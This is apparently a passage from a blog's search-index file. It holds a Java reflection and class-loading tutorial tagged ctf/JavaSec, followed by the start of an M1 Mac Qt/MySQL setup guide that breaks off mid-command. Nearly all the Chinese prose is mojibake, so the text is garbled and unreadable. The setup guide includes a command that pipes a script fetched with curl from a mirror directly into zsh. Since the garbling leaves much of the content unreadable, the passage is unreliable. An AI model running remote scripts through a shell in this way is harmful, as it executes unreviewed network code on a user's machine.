è½½å¹¶è¿æ¥è¯¥ç±»</li><li>å‡å¦‚è¯¥ç±»çš„ç›´æ¥çˆ¶ç±»è¿˜æ²¡è¢«åˆå§‹åŒ–ï¼Œå…ˆåˆå§‹åŒ–å…¶ç›´æ¥çˆ¶ç±»(ä¼šå‘ä¸Šé€’å½’ï¼Œjavaä¸­æœ€å…ˆåˆå§‹åŒ–çš„æ˜¯Objectç±»)</li><li>å‡å¦‚ç±»ä¸­æœ‰åˆå§‹åŒ–è¯­å¥ï¼Œåˆ™ç³»ç»Ÿä¾æ¬¡æ‰§è¡Œè¿™äº›åˆå§‹åŒ–è¯­å¥</li></ul></li></ul><blockquote><p>ç±»çš„åˆå§‹åŒ–æ—¶æœºï¼š</p><ul><li>åˆ›å»ºç±»çš„å®ä¾‹</li><li>è°ƒç”¨ç±»çš„ç±»æ–¹æ³•</li><li>è®¿é—®ç±»æˆ–æ¥å£çš„ç±»å˜é‡ï¼Œæˆ–ä¸ºè¯¥ç±»å˜é‡èµ‹å€¼</li><li>ä½¿ç”¨åå°„æ–¹å¼æ¥å¼ºåˆ¶åˆ›å»ºæŸä¸ªç±»æˆ–æ¥å£å¯¹åº”çš„java.lang.Classå¯¹è±¡</li><li>åˆå§‹åŒ–æŸä¸ªç±»çš„å­ç±»</li><li>ç›´æ¥ä½¿ç”¨java.exeå‘½ä»¤æ¥è¿è¡ŒæŸä¸ªä¸»ç±»</li></ul></blockquote><h3 id="ç±»åŠ è½½å™¨-1"><a href="#ç±»åŠ è½½å™¨-1" class="headerlink" title="ç±»åŠ è½½å™¨"></a>ç±»åŠ è½½å™¨</h3><p>ä½œç”¨</p><ul><li>å°†.classæ–‡ä»¶åŠ è½½åˆ°å†…å­˜ä¸­ï¼Œå¹¶ä¸ºä¹‹ç”Ÿæˆå¯¹åº”çš„java.lang.Classå¯¹è±¡</li></ul><h3 id="javaè™šæ‹Ÿæœºçš„ç±»åŠ è½½æœºåˆ¶"><a href="#javaè™šæ‹Ÿæœºçš„ç±»åŠ è½½æœºåˆ¶" class="headerlink" title="javaè™šæ‹Ÿæœºçš„ç±»åŠ è½½æœºåˆ¶"></a>javaè™šæ‹Ÿæœºçš„ç±»åŠ è½½æœºåˆ¶</h3><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202407032250456.jpg"                      alt="image-20220715194607363"                ><figcaption>image-20220715194607363</figcaption></figure></p><blockquote><p>å†…ç½®ç±»åŠ è½½å™¨</p><p>Bootstrap class loaderâ€“&gt;Platform class loaderâ€“&gt;System class loader </p><p>çˆ¶åˆ°å­çš„é¡ºåº</p></blockquote><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202407032251426.jpg"                      alt="image-20220715195009312"                ><figcaption>image-20220715195009312</figcaption></figure></p><h2 id="åå°„"><a href="#åå°„" class="headerlink" title="åå°„"></a>åå°„</h2><h3 id="æ¦‚è¿°"><a href="#æ¦‚è¿°" class="headerlink" title="æ¦‚è¿°"></a>æ¦‚è¿°</h3><p>æŒ‡åœ¨è¿è¡Œæ—¶è·å–ä¸€ä¸ªç±»çš„å˜é‡å’Œæ–¹æ³•ä¿¡æ¯ï¼Œç„¶åé€šè¿‡è·å–åˆ°çš„ä¿¡æ¯æ¥åˆ›å»ºå¯¹è±¡ï¼Œè°ƒç”¨æ–¹æ³•çš„ä¸€ç§æœºåˆ¶ã€‚ç”±äºè¿™ç§åŠ¨æ€æ€§ï¼Œç¨‹åºä¸ç”¨åœ¨ç¼–è¯‘å™¨å°±å®Œæˆç¡®å®šï¼Œåœ¨è¿è¡Œèµ·ä»å¯ä»¥æ‹“å±•</p><h3 id="è·å–Classå¯¹è±¡"><a href="#è·å–Classå¯¹è±¡" class="headerlink" title="è·å–Classå¯¹è±¡"></a>è·å–Classå¯¹è±¡</h3><ul><li>ä½¿ç”¨ç±»çš„classå±æ€§ï¼Œe.g. <code>Student.class</code></li><li>è°ƒç”¨ç±»çš„getClass()æ–¹æ³•ï¼ˆè¿™æ˜¯Objectç±»çš„æ–¹æ³•ï¼Œæ‰€æœ‰å¯¹è±¡éƒ½æœ‰è¯¥æ–¹æ³•ï¼‰</li><li>Classç±»ä¸­çš„é™æ€æ–¹æ³•ï¼ŒforName(String className)ï¼Œè¯¥æ–¹æ³•è¦ä¼ å…¥å­—ç¬¦ä¸²å‚æ•°ï¼Œè¯¥å­—ç¬¦ä¸²æ˜¯æŸä¸ªç±»çš„å…¨è·¯å¾„ï¼Œä¹Ÿå°±æ˜¯å®Œæ•´åŒ…åçš„è·¯å¾„</li></ul><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Class&lt;Student&gt; c1=Student.class;</span><br><span class="line">System.out.println(c1);</span><br><span class="line">Class&lt;Student&gt; c2=Student.class;</span><br><span class="line">System.out.println(c1==c2);<span class="comment">//trueï¼Œä¸€ä¸ªç±»åœ¨å†…å­˜ä¸­åªæœ‰ä¸€ä¸ªå­—èŠ‚ç å¯¹è±¡</span></span><br><span class="line">Student s=<span class="keyword">new</span> <span class="title class_">Student</span>();</span><br><span class="line">Class&lt;? <span class="keyword">extends</span> <span class="title class_">Student</span>&gt; c3=s.getClass();</span><br><span class="line">System.out.println(c1==c3);<span class="comment">//true</span></span><br><span class="line">Class&lt;?&gt; c4=Class.forName(<span class="string">&quot;com.itheima.Student&quot;</span>);<span class="comment">//forNameè¦æŠ›å‡ºå¼‚å¸¸ClassNotFoundException</span></span><br><span class="line">System.out.println(c1==c4);<span class="comment">//true</span></span><br></pre></td></tr></table></figure></div><h3 id="åå°„æ„é€ æ–¹æ³•"><a href="#åå°„æ„é€ æ–¹æ³•" class="headerlink" title="åå°„æ„é€ æ–¹æ³•"></a>åå°„æ„é€ æ–¹æ³•</h3><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202407032251807.jpg"                      alt="image-20220715214817907"                ><figcaption>image-20220715214817907</figcaption></figure></p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//åå°„æ„é€ æ–¹æ³•å¹¶ä½¿ç”¨</span></span><br><span class="line">Class&lt;?&gt; c=Class.forName(<span class="string">&quot;com.itheima.Student&quot;</span>);</span><br><span class="line"><span class="comment">//å¾—åˆ°æ‰€æœ‰publicæƒé™æ„é€ å‡½æ•°ï¼ˆç§æœ‰é»˜è®¤çš„ä¸èƒ½ï¼‰</span></span><br><span class="line">Constructor&lt;?&gt;[] cons=c.getConstructors();</span><br><span class="line"><span class="keyword">for</span>(Constructor con:cons)&#123;</span><br><span class="line">  System.out.println(con);</span><br><span class="line">&#125;</span><br><span class="line">Constructor&lt;?&gt;[] cons2=c.getDeclaredConstructors();<span class="comment">//å¾—åˆ°æ‰€æœ‰æƒé™çš„æ„é€ å‡½æ•°</span></span><br><span class="line"><span class="keyword">for</span>(Constructor con:cons2)</span><br><span class="line">&#123;</span><br><span class="line">  System.out.println(con);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//è·å¾—æŒ‡å®šæ„é€ å‡½æ•°</span></span><br><span class="line"><span class="comment">//å‚æ•°</span></span><br><span class="line">Constructor&lt;?&gt; con=c.getConstructor();<span class="comment">//å¾—åˆ°å•ä¸ªæ„é€ æ–¹æ³•</span></span><br><span class="line"><span class="comment">//æä¾›å•ä¸ªæ„é€ å‡½æ•°ä¿¡æ¯å’Œè®¿é—®æƒé™</span></span><br><span class="line">Object obj=con.newInstance();<span class="comment">//æ ¹æ®æ„é€ æ–¹æ³•åˆ›å»ºå¯¹è±¡</span></span><br><span class="line">System.out.println(obj);</span><br></pre></td></tr></table></figure></div><blockquote><p>åŸºæœ¬æ•°æ®ç±»å‹ä¹Ÿå¯ä»¥é€šè¿‡.classæ–¹æ³•å¾—åˆ°classå¯¹è±¡ï¼ŒgetConstructoræ–¹æ³•éœ€è¦ä¼ å…¥çš„å‚æ•°éƒ½æ˜¯classç±»å‹ï¼Œå¹¶ä¸”æ˜¯å½“å‰æƒ³è¦è®¿é—®çš„æ„é€ æ–¹æ³•çš„å½¢å‚</p></blockquote><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//åå°„ç»ƒä¹ </span></span><br><span class="line">Class&lt;?&gt; c=Class.forName(<span class="string">&quot;com.itheima.Student&quot;</span>);</span><br><span class="line"><span class="comment">//public Student(String name, int age,String address);</span></span><br><span class="line">Constructor&lt;?&gt; con = c.getConstructor(String.class, <span class="type">int</span>.class, String.class);</span><br><span class="line"><span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> con.newInstance(<span class="string">&quot;sqhy&quot;</span>, <span class="number">4781</span>, <span class="string">&quot;339&quot;</span>);</span><br><span class="line">System.out.println(obj);</span><br><span class="line"><span class="comment">//è®¿é—®ç§æœ‰æ„é€ å‡½æ•°</span></span><br><span class="line"><span class="comment">//å®ç° Student s=new Student(&quot;sqhy&quot;);System.out.println(s);</span></span><br><span class="line">Class&lt;?&gt; c1=Class.forName(<span class="string">&quot;com.itheima.Student&quot;</span>);</span><br><span class="line"><span class="comment">//private Student(String name);</span></span><br><span class="line">Constructor&lt;?&gt; con1=c1.getDeclaredConstructor(String.class);</span><br><span class="line"><span class="comment">//æš´åŠ›åå°„</span></span><br><span class="line"><span class="comment">//public void setAccessible (boolean flag):å€¼ä¸ºtrueæ—¶ï¼Œå–æ¶ˆè®¿é—®æ£€æŸ¥</span></span><br><span class="line">con1.setAccessible(<span class="literal">true</span>);</span><br><span class="line">Object obj1=con1.newInstance(<span class="string">&quot;sqhy&quot;</span>);</span><br><span class="line">System.out.println(obj1);</span><br></pre></td></tr></table></figure></div><blockquote><ul><li>getDeclaredConstructorå¯è·å–æ‰€æœ‰è®¿é—®æƒé™çš„æ„é€ æ–¹æ³•</li><li>getConstructoråªèƒ½å¾—åˆ°publicæƒé™çš„æ„é€ æ–¹æ³•</li></ul><p>éå†æ•°ç»„ç®€ä¾¿å†™æ³•</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(Field filed: fields)&#123;</span><br><span class="line">    System.out.println(filed);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></blockquote><h3 id="é€šè¿‡åå°„å¾—åˆ°æˆå‘˜å˜é‡"><a href="#é€šè¿‡åå°„å¾—åˆ°æˆå‘˜å˜é‡" class="headerlink" title="é€šè¿‡åå°„å¾—åˆ°æˆå‘˜å˜é‡"></a>é€šè¿‡åå°„å¾—åˆ°æˆå‘˜å˜é‡</h3><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202407032251759.jpg"                      alt="image-20220716012613059"                ><figcaption>image-20220716012613059</figcaption></figure></p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//åå°„è·å–æˆå‘˜å˜é‡</span></span><br><span class="line">Class&lt;?&gt; c = Class.forName(<span class="string">&quot;com.itheima.Student&quot;</span>);</span><br><span class="line"><span class="comment">//getFieldsæ–¹æ³•ï¼Œè·å–è¯¥Classå¯¹è±¡è¡¨ç¤ºçš„ç±»æˆ–æ¥å£çš„æ‰€æœ‰å¯è®¿é—®çš„publicå­—æ®µ</span></span><br><span class="line"><span class="comment">//getDeclaredFieldsæ–¹æ³•ï¼Œè·å–è¯¥Classå¯¹è±¡è¡¨ç¤ºçš„ç±»æˆ–æ¥å£çš„æ‰€æœ‰å­—æ®µ</span></span><br><span class="line">Field[] fields = c.getFields();</span><br><span class="line"><span class="keyword">for</span>(Field filed: fields)&#123;</span><br><span class="line">  System.out.println(filed);<span class="comment">//åªå¾—åˆ°publicçš„å˜é‡</span></span><br><span class="line">&#125;</span><br><span class="line">Field[] fields1 = c.getDeclaredFields();</span><br><span class="line"><span class="keyword">for</span>(Field f:fields1)</span><br><span class="line">&#123;</span><br><span class="line">  System.out.println(f);<span class="comment">//å¾—åˆ°æ‰€æœ‰æˆå‘˜å˜é‡</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//æ ¹æ®æŒ‡å®šåç§°</span></span><br><span class="line"><span class="type">Field</span> <span class="variable">ad</span> <span class="operator">=</span> c.getField(<span class="string">&quot;address&quot;</span>);<span class="comment">//è¦æŠ›å‡ºå¼‚å¸¸</span></span><br><span class="line">Constructor&lt;?&gt; con = c.getConstructor();</span><br><span class="line">Object obj=con.newInstance();</span><br><span class="line">ad.set(obj,<span class="string">&quot;339&quot;</span>);<span class="comment">//ç»™objçš„æˆå‘˜å˜é‡adèµ‹å€¼ä¸º&quot;339&quot;</span></span><br><span class="line">System.out.println(obj);</span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//ç»ƒä¹ </span></span><br><span class="line">Class&lt;?&gt; c=Class.forName(<span class="string">&quot;com.itheima.Student&quot;</span>);</span><br><span class="line">Constructor&lt;?&gt; con = c.getConstructor();</span><br><span class="line">Object obj=con.newInstance();</span><br><span class="line"><span class="comment">//nameæ˜¯ç§æœ‰æˆå‘˜</span></span><br><span class="line">Field namef=c.getDeclaredField(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">namef.setAccessible(<span class="literal">true</span>);<span class="comment">//å–æ¶ˆè®¿é—®æ£€æŸ¥</span></span><br><span class="line">namef.set(obj,<span class="string">&quot;sqhy&quot;</span>);</span><br><span class="line">System.out.println(obj);</span><br><span class="line"><span class="type">Field</span> <span class="variable">agef</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;age&quot;</span>);</span><br><span class="line">agef.setAccessible(<span class="literal">true</span>);</span><br><span class="line">agef.set(obj,<span class="number">4781</span>);</span><br><span class="line">System.out.println(obj);</span><br><span class="line"><span class="type">Field</span> <span class="variable">addressf</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;address&quot;</span>);</span><br><span class="line">addressf.setAccessible(<span class="literal">true</span>);</span><br><span class="line">addressf.set(obj,<span class="string">&quot;339&quot;</span>);</span><br><span class="line">System.out.println(obj);</span><br></pre></td></tr></table></figure></div><h3 id="åå°„è·å–æˆå‘˜æ–¹æ³•"><a href="#åå°„è·å–æˆå‘˜æ–¹æ³•" class="headerlink" title="åå°„è·å–æˆå‘˜æ–¹æ³•"></a>åå°„è·å–æˆå‘˜æ–¹æ³•</h3><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202407032251236.jpg"                      alt="image-20220716014440272"                ><figcaption>image-20220716014440272</figcaption></figure></p><blockquote><p>æ³¨ï¼š<code>getDeclaredMethods</code>æ–¹æ³•åªæœ‰æœ¬ç±»çš„æ‰€æœ‰æ–¹æ³•ï¼Œæ²¡æœ‰ç”±ç±»æˆ–æ¥å£å£°æ˜çš„å¯¹è±¡ä»¥åŠä»è¶…ç±»æˆ–è¶…çº§æ¥å£ç»§æ‰¿çš„ç±»</p></blockquote><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//åå°„è·å–æˆå‘˜æ–¹æ³•</span></span><br><span class="line">Class&lt;?&gt; c = Class.forName(<span class="string">&quot;com.itheima.Student&quot;</span>);</span><br><span class="line">Method[] methods = c.getMethods();</span><br><span class="line"><span class="keyword">for</span>(Method m:methods) &#123;</span><br><span class="line">  System.out.println(m);<span class="comment">//æ‰€æœ‰publicæ–¹æ³•ï¼Œä»¥åŠç”±ç±»æˆ–æ¥å£å£°æ˜çš„å¯¹è±¡ä»¥åŠä»è¶…ç±»æˆ–è¶…çº§æ¥å£ç»§æ‰¿çš„ç±»</span></span><br><span class="line">&#125;</span><br><span class="line">Method[] methods1 = c.getDeclaredMethods();</span><br><span class="line"><span class="keyword">for</span>(Method m:methods1) &#123;</span><br><span class="line">  System.out.println(m);<span class="comment">//åªæœ‰æœ¬ç±»çš„æ‰€æœ‰æ–¹æ³•ï¼Œæ²¡æœ‰ç”±ç±»æˆ–æ¥å£å£°æ˜çš„å¯¹è±¡ä»¥åŠä»è¶…ç±»æˆ–è¶…çº§æ¥å£ç»§æ‰¿çš„ç±»</span></span><br><span class="line">&#125;</span><br><span class="line">System.out.println(<span class="string">&quot;---------&quot;</span>);</span><br><span class="line"><span class="comment">//è·å–å•ä¸ª</span></span><br><span class="line"><span class="type">Method</span> <span class="variable">m</span> <span class="operator">=</span> c.getMethod(<span class="string">&quot;method1&quot;</span>);</span><br><span class="line"><span class="comment">//è·å–æ— å‚æ„é€ æ–¹æ³•åˆ›å»ºå¯¹è±¡å¹¶è°ƒç”¨method1æ–¹æ³•</span></span><br><span class="line">Constructor&lt;?&gt; con = c.getConstructor();</span><br><span class="line"><span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> con.newInstance();</span><br><span class="line"><span class="comment">//Object invoke(Object obj,Object...args) åœ¨å…·æœ‰æŒ‡å®šå‚æ•°çš„æŒ‡å®šå¯¹è±¡ä¸Šè°ƒç”¨æ–¹æ³•</span></span><br><span class="line"><span class="comment">//Object è¿”å›å€¼ç±»å‹</span></span><br><span class="line"><span class="comment">//objè°ƒç”¨æ–¹æ³•çš„å¯¹è±¡</span></span><br><span class="line"><span class="comment">//args æ–¹æ³•æ‰€éœ€çš„å‚æ•°</span></span><br><span class="line">m.invoke(obj);<span class="comment">//method1æ²¡æœ‰å‚æ•°,æˆåŠŸè°ƒç”¨ç±»method1æ–¹æ³•</span></span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//ç»ƒä¹ </span></span><br><span class="line">Class&lt;?&gt; c = Class.forName(<span class="string">&quot;com.itheima.Student&quot;</span>);</span><br><span class="line">Constructor&lt;?&gt; con = c.getConstructor();</span><br><span class="line"><span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> con.newInstance();</span><br><span class="line"><span class="type">Method</span> <span class="variable">m1</span> <span class="operator">=</span> c.getMethod(<span class="string">&quot;method1&quot;</span>);</span><br><span class="line">m1.invoke(obj);<span class="comment">//obj.method1()</span></span><br><span class="line"><span class="type">Method</span> <span class="variable">m2</span> <span class="operator">=</span> c.getMethod(<span class="string">&quot;method2&quot;</span>, String.class);</span><br><span class="line">m2.invoke(obj,<span class="string">&quot;sqhy&quot;</span>);<span class="comment">//obj.method2()</span></span><br><span class="line"><span class="comment">//è°ƒç”¨æœ‰è¿”å›å€¼çš„æ–¹æ³•</span></span><br><span class="line"><span class="type">Method</span> <span class="variable">m3</span> <span class="operator">=</span> c.getMethod(<span class="string">&quot;method3&quot;</span>, String.class, <span class="type">int</span>.class);</span><br><span class="line"><span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> m3.invoke(obj, <span class="string">&quot;sqhy&quot;</span>, <span class="number">4781</span>);</span><br><span class="line">System.out.println(o);</span><br><span class="line"><span class="comment">//ç§æœ‰æ–¹æ³•</span></span><br><span class="line"><span class="type">Method</span> <span class="variable">m4</span> <span class="operator">=</span> c.getDeclaredMethod(<span class="string">&quot;function&quot;</span>);</span><br><span class="line">m4.setAccessible(<span class="literal">true</span>);</span><br><span class="line">m4.invoke(obj);</span><br></pre></td></tr></table></figure></div><h3 id="ç»ƒä¹ "><a href="#ç»ƒä¹ " class="headerlink" title="ç»ƒä¹ "></a>ç»ƒä¹ </h3><ul><li><p>åœ¨ArrayList<Integer>ä¸­æ’å…¥ä¸€ä¸ªå­—ç¬¦ä¸²æ•°æ®â€“è¶Šè¿‡æ³›å‹æ£€æŸ¥</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">ArrayList&lt;Integer&gt; array=<span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;Integer&gt;();</span><br><span class="line">array.add(<span class="number">10</span>);</span><br><span class="line">array.add(<span class="number">20</span>);</span><br><span class="line"><span class="comment">//array.add(&quot;asa&quot;);//æŠ¥é”™</span></span><br><span class="line">System.out.println(array);<span class="comment">//[10, 20]</span></span><br><span class="line">Class&lt;? <span class="keyword">extends</span> <span class="title class_">ArrayList</span>&gt; c = array.getClass();</span><br><span class="line"><span class="comment">//è·å–åˆ°åŸå§‹æ–¹æ³•ï¼Œä»è€Œç»•è¿‡æ³›å‹æ£€æŸ¥</span></span><br><span class="line"><span class="type">Method</span> <span class="variable">m</span> <span class="operator">=</span> c.getMethod(<span class="string">&quot;add&quot;</span>, Object.class);</span><br><span class="line">m.invoke(array,<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">m.invoke(array,<span class="string">&quot;sqhy&quot;</span>);</span><br><span class="line">m.invoke(array,<span class="string">&quot;zql&quot;</span>);</span><br><span class="line">System.out.println(array);</span><br></pre></td></tr></table></figure></div></li><li><p>è¿è¡Œé…ç½®æ–‡ä»¶è¿è¡Œç±»çš„æ–¹æ³•</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* é…ç½®æ–‡ä»¶</span></span><br><span class="line"><span class="comment">class.txt</span></span><br><span class="line"><span class="comment">className=xxx</span></span><br><span class="line"><span class="comment">methodName=xxx</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">/* className=com.itheima.S</span></span><br><span class="line"><span class="comment">methodName=study</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">//åŠ è½½æ•°æ®</span></span><br><span class="line">Properties prop=<span class="keyword">new</span> <span class="title class_">Properties</span>();</span><br><span class="line">FileReader fr=<span class="keyword">new</span> <span class="title class_">FileReader</span>(<span class="string">&quot;./class.txt&quot;</span>);<span class="comment">//ç›¸å¯¹è·¯å¾„ï¼Œè¿™é‡Œ.è¡¨ç¤ºæ€»æ–‡ä»¶å¤¹ï¼ˆsrcçš„ä¸Šä¸€çº§ï¼‰</span></span><br><span class="line">prop.load(fr);</span><br><span class="line">fr.close();</span><br><span class="line"><span class="comment">//é€šè¿‡é”®åè·å–å€¼</span></span><br><span class="line"><span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> prop.getProperty(<span class="string">&quot;className&quot;</span>);</span><br><span class="line"><span class="type">String</span> <span class="variable">methodName</span> <span class="operator">=</span> prop.getProperty(<span class="string">&quot;methodName&quot;</span>);</span><br><span class="line"><span class="comment">//é€šè¿‡åå°„ä½¿ç”¨</span></span><br><span class="line">Class&lt;?&gt; c = Class.forName(className);<span class="comment">//com.itheima.S</span></span><br><span class="line">Constructor&lt;?&gt; con = c.getConstructor();</span><br><span class="line"><span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> con.newInstance();</span><br><span class="line"><span class="type">Method</span> <span class="variable">m</span> <span class="operator">=</span> c.getMethod(methodName);<span class="comment">//study</span></span><br><span class="line">m.invoke(obj);</span><br></pre></td></tr></table></figure></div></li></ul>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> JavaSec </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>M1 macä¸‹æ­å»ºä½¿ç”¨qt creator + QMYSQLé©±åŠ¨</title>
      <link href="/2022/08/06/M1-mac%E4%B8%8B%E6%90%AD%E5%BB%BA%E4%BD%BF%E7%94%A8qt-creator-QMYSQL%E9%A9%B1%E5%8A%A8/"/>
      <url>/2022/08/06/M1-mac%E4%B8%8B%E6%90%AD%E5%BB%BA%E4%BD%BF%E7%94%A8qt-creator-QMYSQL%E9%A9%B1%E5%8A%A8/</url>
      
        <content type="html"><![CDATA[<h3 id="ğŸ’¡å‰æï¼šå®‰è£…Xcode"><a href="#ğŸ’¡å‰æï¼šå®‰è£…Xcode" class="headerlink" title="ğŸ’¡å‰æï¼šå®‰è£…Xcode"></a>ğŸ’¡å‰æï¼šå®‰è£…Xcode</h3><h2 id="å®‰è£…homebrew"><a href="#å®‰è£…homebrew" class="headerlink" title="å®‰è£…homebrew"></a>å®‰è£…homebrew</h2><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/bin/zsh -c &quot;$(curl -fsSL https://gitee.com/cunkai/HomebrewCN/raw/master/Homebrew.sh)&quot;</span><br></pre></td></tr></table></figure></div><p>é€‰æ‹©ä¸­ç§‘å¤§é•œåƒï¼Œå¹¶å®‰è£…å¼¹çª—ä¸­çš„å‘½ä»¤è¡Œå¼€å‘è€…å·¥å…·ï¼Œå®‰è£…å®Œå†æ‰§è¡Œä»¥ä¸Šå‘½ä»¤</p><p>åˆ‡æ¢å›½å†…å®‰è£…æº</p><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd &quot;$(brew --repo)&quot; &amp;&amp; git remote set-url origin git://mirrors.ustc.edu.cn/brew.git &amp;&amp; cd &quot;$(brew --repo)/Library/Taps/homebrew/homebrew-core&quot; &amp;&amp; git remote set-url origin https://mirrors.ustc.edu.cn/homebrew-core.git &amp;&amp; cd &quot;$(brew --repo)/Library/Taps/homebrew/homebrew-cask&quot; &amp;&amp; git remote set-url origin https://mirrors.ustc.edu.cn/homebrew-cask.git &amp;&amp; cd &quot;$(brew --repo)&quot;/Library/Taps/homebrew/homebrew-cask-versions &amp;&amp; git remote set-url origin https://github.com/Homebrew/homebrew-cask-versions.git</span><br></pre></td></tr></table></figure></div><p>é‡å¯ç»ˆç«¯ï¼Œä¸‹è½½qt</p><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">brew install 